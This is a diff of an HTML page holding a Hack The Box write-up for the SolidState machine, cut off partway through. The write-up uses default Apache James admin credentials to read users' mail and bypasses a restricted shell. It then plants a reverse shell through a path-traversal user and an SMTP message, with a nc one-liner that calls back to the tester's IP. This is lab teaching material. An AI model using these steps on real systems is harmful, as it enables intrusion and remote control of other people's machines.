@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="generator" content="Hugo 0.101.0" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hack The Box Write-up - SolidState | text/plain</title>
@@ -233,7 +233,7 @@ input:valid {
     <meta itemprop="name" content="Hack The Box Write-up - SolidState">
 <meta itemprop="description" content="Write-up for the machine SolidState from Hack The Box. Requires thorough port scanning to find an esoteric telnet admin interface of the Apache James email server. With default root credentials, you become James admin and break into people&#39;s email inboxes. Inside, you find SSH credentials, bypass a restricted shell and finally find an insecure cron job to escalate to root."><meta itemprop="datePublished" content="2018-01-30T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2018-01-30T00:00:00+00:00" />
-<meta itemprop="wordCount" content="2502"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
+<meta itemprop="wordCount" content="2464"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
 <meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up," />
     <script async src="/js/baffle.js"></script>
     <header>
@@ -336,47 +336,47 @@ As it is an easy box, many people got the user flag and a considerable part mana
 <h1 id="enumeration">Enumeration</h1>
 <h2 id="port-scan">Port scan</h2>
 <p>Given the IP, we start with a basic nmap scan:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">root@kali ~ $ nmap -sV -sC -oN base.log 10.10.10.51
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-23 15:45 EST
-Nmap scan report for 10.10.10.51
-Host is up (0.050s latency).
-Not shown: 995 closed ports
-PORT    STATE SERVICE VERSION
-22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
-| ssh-hostkey:
-|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
-|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
-|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (EdDSA)
-25/tcp  open  smtp    JAMES smtpd 2.3.2
-|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.15.130 [10.10.15.130]),
-80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
-|_http-server-header: Apache/2.4.25 (Debian)
-|_http-title: Home - Solid State Security
-110/tcp open  pop3    JAMES pop3d 2.3.2
-119/tcp open  nntp    JAMES nntpd (posting ok)
-Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre></div><p>We basically find a website, an SSH server and <a href="https://james.apache.org/">Apache James</a>, which is an email solution.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali ~ $ nmap -sV -sC -oN base.log 10.10.10.51
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-23 15:45 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.51
+</span></span><span style="display:flex;"><span>Host is up (0.050s latency).
+</span></span><span style="display:flex;"><span>Not shown: 995 closed ports
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
+</span></span><span style="display:flex;"><span>|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (EdDSA)
+</span></span><span style="display:flex;"><span>25/tcp  open  smtp    JAMES smtpd 2.3.2
+</span></span><span style="display:flex;"><span>|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.15.130 [10.10.15.130]),
+</span></span><span style="display:flex;"><span>80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.25 (Debian)
+</span></span><span style="display:flex;"><span>|_http-title: Home - Solid State Security
+</span></span><span style="display:flex;"><span>110/tcp open  pop3    JAMES pop3d 2.3.2
+</span></span><span style="display:flex;"><span>119/tcp open  nntp    JAMES nntpd (posting ok)
+</span></span><span style="display:flex;"><span>Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>We basically find a website, an SSH server and <a href="https://james.apache.org/">Apache James</a>, which is an email solution.
 While the current version of James is 3.0 and it is under active development, this box runs 2.3.2 which is very old.
 If you would read the docs, you would discover that is offers an admin interface called <a href="http://james.apache.org/server/2.3.2/remotemanager_configuration.html">RemoteManager</a>.
 By default, it runs on port 4555, which does not show up in the list above.
 A full port scan though reveals this port too:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">root@kali ~ $ nmap -p- -oN full.log 10.10.10.51
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-23 15:46 EST
-Nmap scan report for 10.10.10.51
-Host is up (0.058s latency).
-Not shown: 65529 closed ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-25/tcp   open  smtp
-80/tcp   open  http
-110/tcp  open  pop3
-119/tcp  open  nntp
-4555/tcp open  rsip
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>Nmap done: 1 IP address (1 host up) scanned in 27.61 seconds
-</code></pre></div><p>Lesson learned: don&rsquo;t just stick with Nmap&rsquo;s default ports every time.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali ~ $ nmap -p- -oN full.log 10.10.10.51
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-23 15:46 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.51
+</span></span><span style="display:flex;"><span>Host is up (0.058s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65529 closed ports
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>25/tcp   open  smtp
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>110/tcp  open  pop3
+</span></span><span style="display:flex;"><span>119/tcp  open  nntp
+</span></span><span style="display:flex;"><span>4555/tcp open  rsip
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Nmap done: 1 IP address (1 host up) scanned in 27.61 seconds
+</span></span></code></pre></div><p>Lesson learned: don&rsquo;t just stick with Nmap&rsquo;s default ports every time.
 A full scan may show important services.</p>
 <h2 id="website">Website</h2>
 <p>I typically check out websites first to see what&rsquo;s there.
@@ -430,55 +430,55 @@ Finally, we have the telet admin interface on port 4555.</p>
 Checking out exploitdb, we find an exploit for exaclty that version
 It sounds interesting since it prommises code execution.
 You can check out the details of the exploit <a href="https://www.exploit-db.com/exploits/35513/">here</a>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">root@kali ~ $ searchsploit james
------------------------------------------------------------------------- ----------------------------------
- Exploit Title                                                          |  Path
-                                                                        | (/usr/share/exploitdb/)
------------------------------------------------------------------------- ----------------------------------
-Apache James 2.2 - SMTP Denial of Service                               | exploits/multiple/dos/27915.pl
-Apache James Server 2.3.2 - Remote Command Execution                    | exploits/linux/remote/35513.py
-WheresJames Webcam Publisher Beta 2.0.0014 - Remote Buffer Overflow     | exploits/windows/remote/944.c
------------------------------------------------------------------------- ----------------------------------
-</code></pre></div><p>The exploit starts with connecting to 4555 using <code>root</code> / <code>root</code> as the credentials.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali ~ $ searchsploit james
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------ ----------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                          |  Path
+</span></span><span style="display:flex;"><span>                                                                        | (/usr/share/exploitdb/)
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------ ----------------------------------
+</span></span><span style="display:flex;"><span>Apache James 2.2 - SMTP Denial of Service                               | exploits/multiple/dos/27915.pl
+</span></span><span style="display:flex;"><span>Apache James Server 2.3.2 - Remote Command Execution                    | exploits/linux/remote/35513.py
+</span></span><span style="display:flex;"><span>WheresJames Webcam Publisher Beta 2.0.0014 - Remote Buffer Overflow     | exploits/windows/remote/944.c
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------ ----------------------------------
+</span></span></code></pre></div><p>The exploit starts with connecting to 4555 using <code>root</code> / <code>root</code> as the credentials.
 These seem to be the default user.
 Cross-checking <a href="https://redthunder.blog/2016/11/25/install-and-configure-the-apache-james-mail-server/">this</a> article about installing James, we find the same credentials too.
 Funny side note: the blog is from Nov 2016.
 There actually are people who still install this piece of software in the real world.</p>
 <p>Let&rsquo;s log in:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">root@kali ~ $ nc 10.10.10.51 4555
-JAMES Remote Administration Tool 2.3.2
-Please enter your login and password
-Login id:
-root
-Password:
-root
-Welcome root. HELP for a list of commands
-help
-Currently implemented commands:
-help                                    display this help
-listusers                               display existing accounts
-countusers                              display the number of existing accounts
-adduser [username] [password]           add a new user
-verify [username]                       verify if specified user exist
-deluser [username]                      delete existing user
-setpassword [username] [password]       sets a user&#39;s password
-setalias [user] [alias]                 locally forwards all email for &#39;user&#39; to &#39;alias&#39;
-showalias [username]                    shows a user&#39;s current email alias
-unsetalias [user]                       unsets an alias for &#39;user&#39;
-setforwarding [username] [emailaddress] forwards a user&#39;s email to another email address
-showforwarding [username]               shows a user&#39;s current email forwarding
-unsetforwarding [username]              removes a forward
-user [repositoryname]                   change to another user repository
-shutdown                                kills the current JVM (convenient when James is run as a daemon)
-quit                                    close connection
-listusers
-Existing accounts 5
-user: james
-user: thomas
-user: john
-user: mindy
-user: mailadmin
-</code></pre></div><p>Looks like we could do some serious administration here.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali ~ $ nc 10.10.10.51 4555
+</span></span><span style="display:flex;"><span>JAMES Remote Administration Tool 2.3.2
+</span></span><span style="display:flex;"><span>Please enter your login and password
+</span></span><span style="display:flex;"><span>Login id:
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>Welcome root. HELP for a list of commands
+</span></span><span style="display:flex;"><span>help
+</span></span><span style="display:flex;"><span>Currently implemented commands:
+</span></span><span style="display:flex;"><span>help                                    display this help
+</span></span><span style="display:flex;"><span>listusers                               display existing accounts
+</span></span><span style="display:flex;"><span>countusers                              display the number of existing accounts
+</span></span><span style="display:flex;"><span>adduser [username] [password]           add a new user
+</span></span><span style="display:flex;"><span>verify [username]                       verify if specified user exist
+</span></span><span style="display:flex;"><span>deluser [username]                      delete existing user
+</span></span><span style="display:flex;"><span>setpassword [username] [password]       sets a user&#39;s password
+</span></span><span style="display:flex;"><span>setalias [user] [alias]                 locally forwards all email for &#39;user&#39; to &#39;alias&#39;
+</span></span><span style="display:flex;"><span>showalias [username]                    shows a user&#39;s current email alias
+</span></span><span style="display:flex;"><span>unsetalias [user]                       unsets an alias for &#39;user&#39;
+</span></span><span style="display:flex;"><span>setforwarding [username] [emailaddress] forwards a user&#39;s email to another email address
+</span></span><span style="display:flex;"><span>showforwarding [username]               shows a user&#39;s current email forwarding
+</span></span><span style="display:flex;"><span>unsetforwarding [username]              removes a forward
+</span></span><span style="display:flex;"><span>user [repositoryname]                   change to another user repository
+</span></span><span style="display:flex;"><span>shutdown                                kills the current JVM (convenient when James is run as a daemon)
+</span></span><span style="display:flex;"><span>quit                                    close connection
+</span></span><span style="display:flex;"><span>listusers
+</span></span><span style="display:flex;"><span>Existing accounts 5
+</span></span><span style="display:flex;"><span>user: james
+</span></span><span style="display:flex;"><span>user: thomas
+</span></span><span style="display:flex;"><span>user: john
+</span></span><span style="display:flex;"><span>user: mindy
+</span></span><span style="display:flex;"><span>user: mailadmin
+</span></span></code></pre></div><p>Looks like we could do some serious administration here.</p>
 <h1 id="exploiting">Exploiting</h1>
 <p>Now, we could go directly for the exploit mentioned above.
 But reading it carefully, you will see it needs someone to login to the system.
@@ -491,93 +491,93 @@ Then, we connect to port 110 (POP3), log into each user, and fetch the mails.
 For example, this is how to do it for john.
 Be sure to use telnet, not nc, which did not retrieve anything after the welcome banner in my case.
 For a reference of POP3 protocol commands, chech <a href="http://sunnyoasis.com/services/emailviatelnet.html">this</a> out.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">root@kali ~ $ telnet 10.10.10.51 110
-Trying 10.10.10.51...
-Connected to 10.10.10.51.
-Escape character is &#39;^]&#39;.
-+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
-USER john
-+OK
-PASS newpassword
-+OK Welcome john
-LIST
-+OK 1 743
-1 743
-.
-RETR 1
-+OK Message follows
-Return-Path: &lt;mailadmin@localhost&gt;
-Message-ID: &lt;9564574.1.1503422198108.JavaMail.root@solidstate&gt;
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Delivered-To: john@localhost
-Received: from 192.168.11.142 ([192.168.11.142])
-          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
-          for &lt;john@localhost&gt;;
-          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
-Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
-From: mailadmin@localhost
-Subject: New Hires access
-John,
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>Can you please restrict mindy&#39;s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>Thank you in advance.
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>Respectfully,
-James
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>.
-QUIT
-+OK Apache James POP3 Server signing off.
-Connection closed by foreign host.
-</code></pre></div><p>Aha, so this is the mailadmin writing john a message to send a password to Mindy.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali ~ $ telnet 10.10.10.51 110
+</span></span><span style="display:flex;"><span>Trying 10.10.10.51...
+</span></span><span style="display:flex;"><span>Connected to 10.10.10.51.
+</span></span><span style="display:flex;"><span>Escape character is &#39;^]&#39;.
+</span></span><span style="display:flex;"><span>+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
+</span></span><span style="display:flex;"><span>USER john
+</span></span><span style="display:flex;"><span>+OK
+</span></span><span style="display:flex;"><span>PASS newpassword
+</span></span><span style="display:flex;"><span>+OK Welcome john
+</span></span><span style="display:flex;"><span>LIST
+</span></span><span style="display:flex;"><span>+OK 1 743
+</span></span><span style="display:flex;"><span>1 743
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>RETR 1
+</span></span><span style="display:flex;"><span>+OK Message follows
+</span></span><span style="display:flex;"><span>Return-Path: &lt;mailadmin@localhost&gt;
+</span></span><span style="display:flex;"><span>Message-ID: &lt;9564574.1.1503422198108.JavaMail.root@solidstate&gt;
+</span></span><span style="display:flex;"><span>MIME-Version: 1.0
+</span></span><span style="display:flex;"><span>Content-Type: text/plain; charset=us-ascii
+</span></span><span style="display:flex;"><span>Content-Transfer-Encoding: 7bit
+</span></span><span style="display:flex;"><span>Delivered-To: john@localhost
+</span></span><span style="display:flex;"><span>Received: from 192.168.11.142 ([192.168.11.142])
+</span></span><span style="display:flex;"><span>          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
+</span></span><span style="display:flex;"><span>          for &lt;john@localhost&gt;;
+</span></span><span style="display:flex;"><span>          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
+</span></span><span style="display:flex;"><span>Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
+</span></span><span style="display:flex;"><span>From: mailadmin@localhost
+</span></span><span style="display:flex;"><span>Subject: New Hires access
+</span></span><span style="display:flex;"><span>John,
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Can you please restrict mindy&#39;s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Thank you in advance.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Respectfully,
+</span></span><span style="display:flex;"><span>James
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>.
+</span></span><span style="display:flex;"><span>QUIT
+</span></span><span style="display:flex;"><span>+OK Apache James POP3 Server signing off.
+</span></span><span style="display:flex;"><span>Connection closed by foreign host.
+</span></span></code></pre></div><p>Aha, so this is the mailadmin writing john a message to send a password to Mindy.
 If you check out Mindy&rsquo;s mails, you find it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">From: mailadmin@localhost
-Subject: Your Access
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>Dear Mindy,
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>Here are your ssh credentials to access the system. Remember to reset your password after your first login.
-Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>username: mindy
-pass: P@55W0rd1!2@
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>Respectfully,
-James
-</code></pre></div><p>The mail above is actually from mailadmin, not from john.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>From: mailadmin@localhost
+</span></span><span style="display:flex;"><span>Subject: Your Access
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Dear Mindy,
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Here are your ssh credentials to access the system. Remember to reset your password after your first login.
+</span></span><span style="display:flex;"><span>Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>username: mindy
+</span></span><span style="display:flex;"><span>pass: P@55W0rd1!2@
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Respectfully,
+</span></span><span style="display:flex;"><span>James
+</span></span></code></pre></div><p>The mail above is actually from mailadmin, not from john.
 I suspect that was a little mistake.
 Anyways, try to SSH into SolidState with <code>mindy</code> / <code>P@55W0rd1!2@</code> and you get in.
 This is all you have to do to get the <code>user.txt</code> flag.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">root@kali ~ $ ssh mindy@10.10.10.51
-mindy@10.10.10.51&#39;s password:
-Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
-mindy@solidstate:~$ id
--rbash: id: command not found
-mindy@solidstate:~$ ls
-bin  user.txt
-mindy@solidstate:~$ cat user.txt
-4h56... &lt;- flag
-</code></pre></div><p>Don&rsquo;t get too excited about the shell access though since all you get is a <a href="https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html">restricted shell</a>.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali ~ $ ssh mindy@10.10.10.51
+</span></span><span style="display:flex;"><span>mindy@10.10.10.51&#39;s password:
+</span></span><span style="display:flex;"><span>Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms for each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
+</span></span><span style="display:flex;"><span>mindy@solidstate:~$ id
+</span></span><span style="display:flex;"><span>-rbash: id: command not found
+</span></span><span style="display:flex;"><span>mindy@solidstate:~$ ls
+</span></span><span style="display:flex;"><span>bin  user.txt
+</span></span><span style="display:flex;"><span>mindy@solidstate:~$ cat user.txt
+</span></span><span style="display:flex;"><span>4h56... &lt;- flag
+</span></span></code></pre></div><p>Don&rsquo;t get too excited about the shell access though since all you get is a <a href="https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html">restricted shell</a>.
 Fortunately, it is easy though to circumvent it.
 Apparently, you can just execute commands through SSH directly and they will not go through the restricted shell.
 Execute bash this way and you get a real shell, albeit one without a real tty:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">root@kali ~ $ ssh mindy@10.10.10.51 bash
-mindy@10.10.10.51&#39;s password:
-id
-uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
-</code></pre></div><p>This was a little too easy.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali ~ $ ssh mindy@10.10.10.51 bash
+</span></span><span style="display:flex;"><span>mindy@10.10.10.51&#39;s password:
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
+</span></span></code></pre></div><p>This was a little too easy.
 It is a lot more fun to use the James exploit to bypass the restricted shell.
 Let&rsquo;s do that next.</p>
 <h2 id="exploiting-james">Exploiting James</h2>
@@ -588,84 +588,83 @@ Then you can send an email to that user.
 It&rsquo;s text is put into a file inside that directory.
 Consequently, the next time a user logs into the system, your email will be executed.</p>
 <p>First, we log into the admin interface and create the user:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">root@kali ~ $ nc 10.10.10.51 4555
-JAMES Remote Administration Tool 2.3.2
-Please enter your login and password
-Login id:
-root
-Password:
-root
-Welcome root. HELP for a list of commands
-adduser ../../../../../../../../etc/bash_completion.d password
-User ../../../../../../../../etc/bash_completion.d added
-quit
-Bye
-</code></pre></div><p>Next, we send an email with a reverse shell payload.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali ~ $ nc 10.10.10.51 4555
+</span></span><span style="display:flex;"><span>JAMES Remote Administration Tool 2.3.2
+</span></span><span style="display:flex;"><span>Please enter your login and password
+</span></span><span style="display:flex;"><span>Login id:
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>Welcome root. HELP for a list of commands
+</span></span><span style="display:flex;"><span>adduser ../../../../../../../../etc/bash_completion.d password
+</span></span><span style="display:flex;"><span>User ../../../../../../../../etc/bash_completion.d added
+</span></span><span style="display:flex;"><span>quit
+</span></span><span style="display:flex;"><span>Bye
+</span></span></code></pre></div><p>Next, we send an email with a reverse shell payload.
 Note the single quotes enclosing everything from the start of the MAIL FROM address to the beginning of the payload.
 They make sure the rest of the mail does not interfere with the payload.
 More details and examples how to use SMTP via telnet are in the <a href="https://mailtrap.io/blog/2016-07-26-how-to-test-smtp-server">Mailtrap blog</a> or <a href="https://utcc.utoronto.ca/usg/technotes/smtp-intro.html">here</a>.
 Be sure to use EHLO, not HELO, to say hello.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">root@kali ~ $ telnet 10.10.10.51 25
-Trying 10.10.10.51...
-Connected to 10.10.10.51.
-Escape character is &#39;^]&#39;.
-220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Sun, 28 Jan 2018 17:42:35 -0500 (EST)
-EHLO someone@mydomain
-250-solidstate Hello someone@mydomain (10.10.15.130 [10.10.15.130])
-250-PIPELINING
-250 ENHANCEDSTATUSCODES
-MAIL FROM: &lt;&#39;@mydomain&gt;
-250 2.1.0 Sender &lt;&#39;@mydomain&gt; OK
-RCPT TO: &lt;../../../../../../../../etc/bash_completion.d&gt;
-250 2.1.5 Recipient &lt;../../../../../../../../etc/bash_completion.d@localhost&gt; OK
-DATA
-354 Ok Send data ending with &lt;CRLF&gt;.&lt;CRLF&gt;
-FROM: someone@mydomain
-&#39;
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.130 1234 &gt;/tmp/f
-.
-250 2.6.0 Message received
-quit
-221 2.0.0 solidstate Service closing transmission channel
-Connection closed by foreign host.
-</code></pre></div><p>Now run <code>nc -lnvp 1234</code> locally and then <code>ssh mindy@10.10.10.51</code> to trigger the payload.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali ~ $ telnet 10.10.10.51 25
+</span></span><span style="display:flex;"><span>Trying 10.10.10.51...
+</span></span><span style="display:flex;"><span>Connected to 10.10.10.51.
+</span></span><span style="display:flex;"><span>Escape character is &#39;^]&#39;.
+</span></span><span style="display:flex;"><span>220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Sun, 28 Jan 2018 17:42:35 -0500 (EST)
+</span></span><span style="display:flex;"><span>EHLO someone@mydomain
